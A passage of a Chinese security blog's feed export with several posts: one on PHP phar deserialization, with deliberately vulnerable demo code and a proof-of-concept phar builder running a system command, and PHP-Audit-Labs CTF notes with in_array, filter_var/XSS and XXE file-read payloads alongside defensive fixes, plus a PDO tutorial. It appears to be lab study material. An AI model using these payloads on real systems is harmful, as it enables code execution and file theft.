id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>经过对phar进行的反序列化攻击的原理说明，我们清楚了在没有unserilize的前提下，还是可以进行反序化漏洞的利用的。 但是phar的利用还是要清楚下面几点利用条件：<br><strong>1.phar文件能上传到服务器</strong><br><strong>2.文件处理函数的参数可控</strong><br><strong>3.用可以的魔法方法作为跳板</strong><br><strong>4.没有过滤像phar一些特殊字符</strong></p><h3 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h3><p>自己在本地写个文件上传代码进行测试，代码如下：<br>upload.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;</span><br><span class="line">            文件上传页面</span><br><span class="line">        &lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form action&#x3D;&quot;check_file.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;filename&quot;&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">        &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><br>check_file.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function get_rand_filename()</span><br><span class="line">&#123;</span><br><span class="line">    $base_filename&#x3D;@date(&quot;YmdHis&quot;);</span><br><span class="line">    &#x2F;&#x2F;形成六位随机数</span><br><span class="line">    for ($i&#x3D;0;$i&lt;6;$i++)</span><br><span class="line">    &#123;</span><br><span class="line">        switch (mt_rand(0,2))</span><br><span class="line">        &#123;</span><br><span class="line">            case (0):</span><br><span class="line">                $base_filename .&#x3D;chr(mt_rand(97,122));</span><br><span class="line">                break;</span><br><span class="line">            case (1):</span><br><span class="line">                $base_filename .&#x3D;chr(mt_rand(65,90));</span><br><span class="line">            case (2):</span><br><span class="line">                $base_filename .&#x3D;mt_rand(0,9);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $base_filename;</span><br><span class="line">&#125;</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">$maxsize&#x3D;1024*1024*3;</span><br><span class="line">$accept_filename&#x3D;[&quot;image&#x2F;jpg&quot;,&quot;image&#x2F;jpeg&quot;,&quot;image&#x2F;png&quot;,&quot;image&#x2F;gif&quot;];</span><br><span class="line">if (!in_array($_FILES[&quot;filename&quot;][&quot;type&quot;],$accept_filename))</span><br><span class="line">&#123;</span><br><span class="line">    exit(&quot;不允许上传&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$info&#x3D;pathinfo($_FILES[&quot;filename&quot;][&quot;name&quot;],PATHINFO_EXTENSION);</span><br><span class="line">$basename&#x3D;get_rand_filename();</span><br><span class="line">$filname&#x3D;$basename.&quot;.&quot;.$info;</span><br><span class="line">$base_dir&#x3D;&quot;G:&#x2F;&#x2F;PHPstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;PHP&#x2F;ceshi&#x2F;phar&#x2F;exercise&#x2F;upload&quot;;</span><br><span class="line">$dest&#x3D;$base_dir.&quot;&#x2F;&quot;.$filname;</span><br><span class="line">$tmp&#x3D;$_FILES[&quot;filename&quot;][&quot;tmp_name&quot;];</span><br><span class="line">move_uploaded_file($tmp,$dest);</span><br><span class="line">echo $dest;</span><br></pre></td></tr></table></figure><br>bug.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$finame &#x3D; isset($_GET[&#39;name&#39;]) ? $_GET[&quot;name&quot;]:&quot;&quot;;</span><br><span class="line">class OjectTest&#123;</span><br><span class="line">    public $u1s1&#x3D;&quot;111&quot;;</span><br><span class="line">    public function __construct($u)&#123;</span><br><span class="line">        $this-&gt;u1s1 &#x3D; $u;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        system($this-&gt;u1s1);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">if(file_exists($finame))&#123;</span><br><span class="line">    $da4er &#x3D; new OjectTest();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    exit(&quot;1&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>poc.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type:text&#x2F;html;charset&#x3D;&#39;utf-8&#39;&quot;);</span><br><span class="line">class OjectTest&#123;</span><br><span class="line">    public $u1s1;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;如果存在phar文件先删除</span><br><span class="line">@unlink(&quot;da4er.phar&quot;);</span><br><span class="line">$phar &#x3D; new Phar(&quot;da4er.phar&quot;);</span><br><span class="line">&#x2F;&#x2F;开始生成phar文件</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">&#x2F;&#x2F;设置phar文件标志</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">&#x2F;&#x2F;自定义的meta-data文件</span><br><span class="line">$o &#x3D; new OjectTest();</span><br><span class="line">$o-&gt;u1s1 &#x3D; &quot;ipconfig&quot;;</span><br><span class="line">$phar-&gt;setMetadata($o);&#x2F;&#x2F;将自定义的meta-data文件存入phar文件</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);</span><br><span class="line">&#x2F;&#x2F;在停止写入phar文件，自动生成签名</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><br>最终的执行效果：<br><img src="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/6.png" class title="This is an test image"></p>]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;一般的反序列化漏洞都是要通过unserialize函数，进行反序列化之后才能触发的。但是如果在没有unserialize函数触发前提下，那么该怎么利用反序列化漏洞呢？这里就需要使用phar://进行等效替代。&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="https://da4er.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP中的PDO预处理机制</title>
    <link href="https://da4er.top/PHP%E4%B8%AD%E7%9A%84PDO%E9%A2%84%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6.html"/>
    <id>https://da4er.top/PHP%E4%B8%AD%E7%9A%84PDO%E9%A2%84%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6.html</id>
    <published>2020-03-09T15:19:41.000Z</published>
    <updated>2020-03-09T15:20:29.251Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p>具体代码如下，PDO预处理机制主要用于数据库交互。<br>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create By Da4er.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//使用pdo连接数据库</span></span><br><span class="line">$dsn = <span class="string">"mysql:host=127.0.0.1;port=3306;dbname=pikachu;charset=utf8"</span>;</span><br><span class="line">$username = <span class="string">"root"</span>;</span><br><span class="line">$pasword =<span class="string">"123"</span>;</span><br><span class="line">$PDOObject =<span class="keyword">new</span> PDO($dsn, $username, $pasword);</span><br><span class="line">var_dump($PDOObject);</span><br><span class="line"><span class="comment">//对象常用方法</span></span><br><span class="line"><span class="comment">//exec()函数 执行sql语句，返回影响的行数</span></span><br><span class="line"><span class="comment">//$sql = "insert into users(id,username,password) values (null,'admin','345')";</span></span><br><span class="line"><span class="comment">//$count = $PDOObject-&gt;exec($sql);</span></span><br><span class="line"><span class="comment">//echo "影响的行数为:&#123;$count&#125;";</span></span><br><span class="line"><span class="comment">//query()函数，执行一个sql语句 返回一个结果集</span></span><br><span class="line"><span class="comment">//$sql = "select * from users";</span></span><br><span class="line"><span class="comment">//$result = $PDOObject-&gt;query($sql);</span></span><br><span class="line"><span class="comment">//var_dump($result);</span></span><br><span class="line"><span class="comment">//lastInsertId() 返回最后插入行的id或序列值(string类型)</span></span><br><span class="line"><span class="comment">//$sql = "insert into users(id,username,password) values (null,'admin','345')";</span></span><br><span class="line"><span class="comment">//$count = $PDOObject-&gt;exec($sql);</span></span><br><span class="line"><span class="comment">//echo "影响的行数为:&#123;$count&#125;";</span></span><br><span class="line"><span class="comment">//$id = $PDOObject-&gt;lastInsertId();</span></span><br><span class="line"><span class="comment">//echo $id;</span></span><br><span class="line"><span class="comment">//setAttribute()设置pdo的一些通用属性 看手册</span></span><br><span class="line"><span class="comment">//PDOStatement对象常用方法</span></span><br><span class="line"><span class="comment">// fetch()从结果集中获取一行，并向下移动指针</span></span><br><span class="line">$sql = <span class="string">"select * from users"</span>;</span><br><span class="line"><span class="comment">//$result = $PDOObject-&gt;query($sql);</span></span><br><span class="line"><span class="comment">//while($arr=$result-&gt;fetch(PDO::FETCH_ASSOC))&#123;</span></span><br><span class="line"><span class="comment">//    print_r($arr);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//fetchALL()返回一个包含结果集中所有行的数组</span></span><br><span class="line">$result = $PDOObject-&gt;query($sql);</span><br><span class="line">$arr = $result-&gt;fetchAll(PDO::FETCH_ASSOC);</span><br><span class="line"><span class="comment">//foreach ($arr as $key=&gt;$value)&#123;</span></span><br><span class="line"><span class="comment">//    foreach ($value as $key2=&gt;$value2)&#123;</span></span><br><span class="line"><span class="comment">//        echo $key2."=&gt;".$value2."\r\n";</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//rowCount()返回影响行数</span></span><br><span class="line">$count = $result-&gt;rowCount();</span><br><span class="line"><span class="keyword">echo</span> $count;</span><br><span class="line"><span class="comment">//PDO预处理 important</span></span><br><span class="line"><span class="comment">//使用问号占位符</span></span><br><span class="line">$sql = <span class="string">"insert into users(id,username,password) values (?,?,?)"</span>;</span><br><span class="line">$result = $PDOObject-&gt;prepare($sql);</span><br><span class="line">$result-&gt;bindValue(<span class="number">1</span>,<span class="number">12</span>);</span><br><span class="line">$result-&gt;bindValue(<span class="number">2</span>,<span class="string">"da4er"</span>);</span><br><span class="line">$result-&gt;bindValue(<span class="number">3</span>,<span class="string">"qweasdzxc"</span>);</span><br><span class="line">$result-&gt;execute();</span><br><span class="line"><span class="comment">//使用值占位符</span></span><br><span class="line">$sql = <span class="string">"insert into users(id,username,password) values (:id,:username,:password)"</span>;</span><br><span class="line">$result = $PDOObject-&gt;prepare($sql);</span><br><span class="line">$result-&gt;bindValue(<span class="string">":id"</span>,<span class="number">13</span>);</span><br><span class="line">$result-&gt;bindValue(<span class="string">":username"</span>,<span class="string">"admin888"</span>);</span><br><span class="line">$result-&gt;bindValue(<span class="string">":password"</span>,<span class="string">"888"</span>);</span><br><span class="line">$result-&gt;execute();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;具体代码如下，PDO预处理机制主要用于数据库交互。&lt;br&gt;代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;tabl
      
    
    </summary>
    
    
      <category term="开发" scheme="https://da4er.top/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Python os标准库</title>
    <link href="https://da4er.top/Python-os%E6%A0%87%E5%87%86%E5%BA%93.html"/>
    <id>https://da4er.top/Python-os%E6%A0%87%E5%87%86%E5%BA%93.html</id>
    <published>2020-03-09T10:15:53.000Z</published>
    <updated>2020-03-09T10:17:24.222Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="6edbeacdcd856bf76e95ea0d1b1829059656ce4678f58379d9c8ace548871b1e"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Python" scheme="https://da4er.top/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>Python sys标准库学习</title>
    <link href="https://da4er.top/Python-sys%E6%A0%87%E5%87%86%E5%BA%93%E5%AD%A6%E4%B9%A0.html"/>
    <id>https://da4er.top/Python-sys%E6%A0%87%E5%87%86%E5%BA%93%E5%AD%A6%E4%B9%A0.html</id>
    <published>2020-03-06T10:35:33.000Z</published>
    <updated>2020-03-06T10:37:09.689Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="5b79f75f661a9ee5dbcc15fc7e465ec7e8a59598368877cc22802c68f0637721"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Python" scheme="https://da4er.top/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP-Audit-Labs练习 持续更新....</title>
    <link href="https://da4er.top/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-03-05T06:00:15.000Z</published>
    <updated>2020-03-10T10:45:23.269Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script></p><h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><h4 id="in-array-函数漏洞"><a href="#in-array-函数漏洞" class="headerlink" title="in_array()函数漏洞"></a>in_array()函数漏洞</h4><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="Da4er"><a id="more"></a><p>这个漏洞的关键在于第三个参数上，如果没设置为true就会出现问题。<br>题目给的代码如下：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="Da4er"><br>我们发现post传进去的rate参数，只使用了in_array函数进行过滤并且没有设置第三个参数为true。<br>那么我们传入<strong>rate=3shell.php</strong>的话，在使用in_array()进行检查的时候，会<strong>先把rate转换成3</strong>，然后在判断是否存在。这样就会绕过in_array检测机制。<br>测试代码如下：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="Da4er"><br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="Da4er"></p><h4 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h4><h5 id="1-使用intval强制转换成int类型"><a href="#1-使用intval强制转换成int类型" class="headerlink" title="1.使用intval强制转换成int类型"></a>1.使用intval强制转换成int类型</h5><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/8.png" class title="Da4er"><p>这样即使我们输入的参数不合法，也会被强制转换为int类型，从而不会造成危害。</p><h5 id="2-将in-array函数的第三个参数设置为true"><a href="#2-将in-array函数的第三个参数设置为true" class="headerlink" title="2.将in_array函数的第三个参数设置为true"></a>2.将in_array函数的第三个参数设置为true</h5><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/9.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/10.png" class title="Da4er"><p>这样在比较的时候，要求类型也要一样，从而不会绕过。</p><h4 id="CTF-Docker-题目"><a href="#CTF-Docker-题目" class="headerlink" title="CTF Docker 题目"></a>CTF Docker 题目</h4><p>主要代码如下：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/11.png" class title="Da4er"><br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/12.png" class title="Da4er"><br>在index.php页面，发现使用了in_array函数，但是没有加以限制，这就会造成这个函数的检测形如虚设。我们只需绕过stop_hack即可。<br>检查正则表达式发现没有过滤报错函数，我们可以进行报错注入得到flag。</p><hr><h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><h4 id="filter-var函数缺陷"><a href="#filter-var函数缺陷" class="headerlink" title="filter_var函数缺陷"></a>filter_var函数缺陷</h4><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/13.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/14.png" class title="Da4er"><p>当第二个参数设置为上图的值，会检测第一个参数是否为正确的url。<br>这里是可以绕过的，一般可以使用：javascript:// file:// test://等绕过。<br>注意：javascript:// 中的//是注释符，当我们使用这个弹框时可以使用如下payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">javascript:&#x2F;&#x2F;comment％250aalert(1)</span><br><span class="line">其中的%250a&#x3D;&gt;%0a 是换行符的意思。</span><br></pre></td></tr></table></figure><br>测试代码如下：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/15.png" class title="Da4er"><br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/16.png" class title="Da4er"><br>发现这是可以绕过的。</p><h4 id="防御措施-1"><a href="#防御措施-1" class="headerlink" title="防御措施"></a>防御措施</h4><p>不光要使用filter_var进行过滤，还要使用其他的过滤的措施。<br>如下图，xss防御措施：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/17.png" class title="Da4er"></p><h4 id="CTF-Docker-题目-1"><a href="#CTF-Docker-题目-1" class="headerlink" title="CTF Docker 题目"></a>CTF Docker 题目</h4><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/18.png" class title="Da4er"><p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;file:&#x2F;&#x2F;||sec-redclub.com</span><br></pre></td></tr></table></figure><br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/19.png" class title="Da4er"></p><hr><h2 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h2><h3 id="实例化任意对象漏洞"><a href="#实例化任意对象漏洞" class="headerlink" title="实例化任意对象漏洞"></a>实例化任意对象漏洞</h3><p><strong>实列化对象漏洞是:用户可以输入一个参数，作为对象名，输入任意个参数，作为对象的参数。如果没有对用户输入做严格限制就会导致这个漏洞。</strong><br>直接拿CTF题来演示，用到的函数如下：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/20.png" class title="Da4er"><br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/21.png" class title="Da4er"><br>题目如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class NotFound</span><br><span class="line">&#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        die(&#39;404&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spl_autoload_register(</span><br><span class="line">    function ($class) &#123;</span><br><span class="line">        new NotFound();</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">$classname &#x3D; isset($_GET[&#39;name&#39;]) ? $_GET[&#39;name&#39;] : null;</span><br><span class="line">$param &#x3D; isset($_GET[&#39;param&#39;]) ? $_GET[&#39;param&#39;] : null;</span><br><span class="line">$param2 &#x3D; isset($_GET[&#39;param2&#39;]) ? $_GET[&#39;param2&#39;] : null;</span><br><span class="line">if (class_exists($classname)) &#123;</span><br><span class="line">    $newclass &#x3D; new $classname($param, $param2);</span><br><span class="line">    var_dump($newclass);</span><br><span class="line">    foreach ($newclass as $key &#x3D;&gt; $value)</span><br><span class="line">        echo $key . &#39;&#x3D;&gt;&#39; . $value . &#39;&lt;br&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>class_exists 函数来判断类是否存在，如果不存在的话，就会调用程序中的 <strong>autoload 函数，但是这里没有 </strong>autoload 函数，而是用 spl_autoload_register 注册了一个类似 __autoload 作用的函数，即这里输出404信息。<br>这个发现没有对用户输入进行限制，可以造成xxe任意文件读取漏洞。<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/22.png" class title="Da4er"><br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/23.png" class title="Da4er"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;GlobIterator&amp;param&#x3D;.&#x2F;*.php&amp;param2&#x3D;0</span><br></pre></td></tr></table></figure><br>最后payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;G:&#x2F;PHPstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;flag.txt&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;&#x2F;x&gt;&amp;param2&#x3D;2</span><br></pre></td></tr></table></figure><br>这里注意的是：读取文件要使用php伪协议，因为：当文件中存在： &lt; &gt; &amp; ‘ “ 这5个符号时，会导致XML文件解析错误。<br>最后成功读取到文件。<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/24.png" class title="Da4er"></p><hr><h2 id="Day4"><a href="#Day4" class="headerlink" title="Day4"></a>Day4</h2><h3 id="strpos使用不当引发漏洞"><a href="#strpos使用不当引发漏洞" class="headerlink" title="strpos使用不当引发漏洞"></a>strpos使用不当引发漏洞</h3><p>说是strpos函数，其实就是程序员对一些php漏洞点理解不当而造成的。<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/25.png" class title="Da4er"></p><p>实列代码如下：<br><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/26.png" class title="Da4er"></p><p>看到第8，9行，通过strpos函数检测$user和pass是否包含&lt;&gt;，但是这个有个忽略点：false 和 0 的取反均为 true 。<br>所以如果我们让$user或$pass开头包含&lt;，则返回的是true。<br>我们通过实列测试一下：<br><img 